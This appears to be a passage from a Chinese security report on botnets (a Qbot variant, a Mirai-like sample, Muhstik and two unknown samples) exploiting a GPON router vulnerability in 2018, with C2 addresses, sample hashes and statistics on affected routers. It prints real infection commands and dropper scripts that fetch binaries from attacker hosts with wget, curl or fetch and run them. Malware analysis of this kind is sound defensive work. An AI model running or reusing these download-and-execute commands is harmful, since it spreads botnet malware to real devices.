该样本的感染逻辑没有太大变化， `CNC` 与上文相同，为： `185.33.145.92:252`，所以我们认为这与上文同属于 `Q
bot`僵尸网络家族的变种。
##### 2.3 58.215.144.205 样本（2018/05/08 版本）
    # sha256sum 0508/58.215.144.205/mips
    9590cc3c1e7a32f6221528b526212b2ad87b793b885639580c276243ec60830b 0508/58.215.144.205/mips
`2018/05/08`，`58.215.144.205/mips`更新了相关的样本。通过逆向的结果看，新的样本与之前的逻辑完全不同，恶意控制者更换了控制的程序。
新的样本看起来更像是 `Mirai` 僵尸网络的新变种，具体的感染细节我们仍在持续跟进中。
该样本的CNC为 `linuxusaarm.com:443`
#### 3\. `Muhstik` 僵尸网络
> 2018/04/20，360netlab曝光了一个长期存在的僵尸网络：`Muhstik僵尸网络`。在本次漏洞事件中，我们也发现了大量
> `Muhstik`僵尸网络的身影。  
>  该僵尸网络使用的感染命令如下：  
>  编号3 `wget -qO - http://162.243.211.204/gpon|sh`  
>  编号4 `wget -qO - http://162.243.211.204/aio|sh`  
>  编号5 `wget -O /tmp/par http://162.243.211.204/mrt; chmod x /tmp/ping`  
>  编号8 `wget -qO - http://54.39.23.28/1sh | sh`  
>  编号9 `wget -qO - http://104.54.236.173/gpon | sh`
由于该僵尸网络样本众多，多条命令有多次重复感染。故我们通过下图展示各样本和各IP的联系：
图中红点代表各IP，灰点代表感染的bash脚本，黄点代表各恶意样本，蓝点代表出现的链接，红线代表从bash脚本中下载的样本
  * 各感染脚本如下：
    # cat 104.54.236.173/gpon
    wget -O /tmp/cron http://162.243.211.204/cron; chmod +x /tmp/cron; chmod 700 /tmp/cron; /tmp/cron &
    wget -O /tmp/nsshpftp http://162.243.211.204/nsshpftp; chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp  &
    # cat 162.243.211.204/gpon
    wget -O /tmp/nsshcron http://162.243.211.204/nsshcron; chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron&
    wget -O /tmp/nsshpftp http://162.243.211.204/nsshpftp; chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp  &
    # cat 162.243.211.204/gpon
    wget -O /tmp/nsshcron http://162.243.211.204/nsshcron; chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron&
    wget -O /tmp/nsshpftp http://162.243.211.204/nsshpftp; chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp  &root@vultr:~/gpon# cat 54.39.23.28/1sh
    wget -O /tmp/cron http://51.254.221.129/c/cron; chmod +x /tmp/cron; chmod 700 /tmp/cron; /tmp/cron &
    wget -O /tmp/tfti http://51.254.221.129/c/tfti; chmod +x /tmp/tfti; chmod 700 /tmp/tfti; /tmp/tfti &
    wget -O /tmp/pftp http://51.254.221.129/c/pftp; chmod +x /tmp/pftp; chmod 700 /tmp/pftp; /tmp/pftp &
    wget -O /tmp/ntpd http://51.254.221.129/c/ntpd; chmod +x /tmp/ntpd; chmod 700 /tmp/ntpd; /tmp/ntpd  &
    wget -O /tmp/sshd http://51.254.221.129/c/sshd; chmod +x /tmp/sshd; chmod 700 /tmp/sshd; /tmp/sshd  &
    wget -O /tmp/bash http://51.254.221.129/c/bash; chmod +x /tmp/bash; chmod 700 /tmp/bash; /tmp/bash  &
    wget -O /tmp/pty http://51.254.221.129/c/pty; chmod +x /tmp/pty; chmod 700 /tmp/pty; /tmp/pty  &
    wget -O /tmp/shy http://51.254.221.129/c/shy; chmod +x /tmp/shy; chmod 700 /tmp/shy; /tmp/shy  &
    wget -O /tmp/nsshtfti http://51.254.221.129/c/nsshtfti; chmod +x /tmp/nsshtfti; chmod 700 /tmp/nsshtfti; /tmp/nsshtfti &
    wget -O /tmp/nsshcron http://51.254.221.129/c/nsshcron; chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron  &
    wget -O /tmp/nsshpftp http://51.254.221.129/c/nsshpftp; chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp  &
    fetch -o /sbin/kmpathd http://51.254.221.129/c/fbsd; chmod +x /sbin/kmpathd; /sbin/kmpathd &
  * 各样本`sha256`值如下:
    5f2b198701ce619c6af308bcf3cdb2ef36ad2a5a01b9d9b757de1b066070dad7  51.254.221.129/c/bash
    f12aa6748543fde5d3b6f882418035634d559fc4ab222d6cfb399fd659b5e34f  51.254.221.129/c/cron
    54b951302c8da4f9de837a0309cce034a746345d2f96a821c7fc95aa93752d43  51.254.221.129/c/fbsd
    2cfa79ce4059bbc5798f6856cf82af7fce1d161d6ef398c07f01a010ba5299ea  51.254.221.129/c/nsshcron
    3ca8c549357d6121b96256715709bccf16a249dcc45bad482f6c8123fc75642f  51.254.221.129/c/nsshpftp
    d4fba221b1a706dd3c617e33077d1072b37b2702c3235d342d94abfd032ba5f8  51.254.221.129/c/nsshtfti
    e2267edd2b70b5f42a2da942fa47cca98e745f2f2ff8f3bbf7baf8b1331c1a89  51.254.221.129/c/ntpd
    cfc82255b7e75da9cd01cffdfd671ccf6fafaa3f705041d383149c1191d8bdff  51.254.221.129/c/pftp
    5e8398c89631ea8d9e776ec9bdd6348cb32a77b300ab8b4ead1860a6a1e50be7  51.254.221.129/c/pty
    948ef8732346e136320813aade0737540ef498945c1ea14f26a2677e4d64fdee  51.254.221.129/c/shy
    5477129edd21ce219e2a8ecf4c0930532c73417702215f5813c437f66c8b0299  51.254.221.129/c/sshd
    c937caa3b2e6cbf2cc67d02639751c320c8832047ff3b7ad5783e0fd9c2d7bae  51.254.221.129/c/tfti
    3138079caea0baa50978345b58b8d4b05db461b808710146d4e0abb5461c97df  162.243.211.204/aiomips
    f12aa6748543fde5d3b6f882418035634d559fc4ab222d6cfb399fd659b5e34f  162.243.211.204/cron
    5b71ba608e417fb966ff192578d705a05eab4ff825541d9394c97271196cfd69  162.243.211.204/mrt
  * CNC  
`192.99.71.250:9090`
#### 4\. 未知样本1
> 该样本使用的感染命令如下：  
>  编号6 `curl -fsSL http://ztccds.freesfocss.com/test.txt | sh`
    # sha256sum ztccds.freesfocss.com/zt_arm
    24602f1c6d354e3a37d4a2e2dd9cef0098f390e1297c096997cc20da4795f2a2  ztccds.freesfocss.com/zt_arm
该样本会连接 `ztccds.freesfocss.com:23364`,样本具体功能仍在研究中。
#### 5\. 未知样本2
> 该样本使用的感染命令如下：  
>  编号11 `busybox wget http://185.246.152.173/omni -O /tmp/talk`  
>  该样本运行的命令为 `/tmp/talk gpon`
    # sha256sum 185.246.152.173/omni
    18c23bd57c8247db1de2413ce3ff9e61c5504c43cbadaaefce2fb59f4b3c10a0  185.246.152.173/omni
该样本会连接`185.246.152.173:1000`,但该端口已经关闭(2018/05/09)。
## 0x02 受影响主机范围
> 注：由于仅探测了`diag.html`页面，故在多轮探测中我们只能确定哪些主机被攻击，无法判断攻击者是否攻击成功
### 一. 探测到的主机均集中在墨西哥
在对探测到的主机进行地域划分时，三轮探测中被攻击的IP都位于墨西哥。  
对受影响最多的五个国家进行抽样测试，结果如下：
该漏洞存在与墨西哥和哈萨克斯坦，但是由于固件不同，只有墨西哥的路由器会返回`diag_host`，所以我们仅监测到墨西哥的路由器受影响情况。
由于墨西哥的设备占据了全球设备的一半以上，我们认为相关数据依旧可以反应僵尸网络的实际情况。
### 二. 受攻击的路由器执行的命令情况
> 由于`2018/05/05`第一轮探测中只统计了存在`/tmp`字段的`diag_host`的内容，所以第一轮探测的数据具有一定的局限性。
可以很明显看出：
  1. 确认被攻击的路由器数量在不断增加
  2. 各僵尸网络活动频繁，`2018/05/07` `Muhstik` 僵尸网络发动大量攻击，而`2018/05/08`就变成了 `Q bot`僵尸网络变种。僵尸网络之间的竞争可见一斑。
## 0x03 结语
近年来，僵尸网络逐渐盯上攻击简单但危害巨大的物联网漏洞。从去年的`GoAhead`到今年的`GPON`事件，无不在提醒我们物联网安全的重要性。能结合`ZoomEye网络空间搜索引擎`了解到`GPON`事件背后活跃的僵尸网络动态，对我们来说就是一种收获。
## 附录
关于`ZoomEye Dork`，欢迎加入小密圈（免费）：
* * *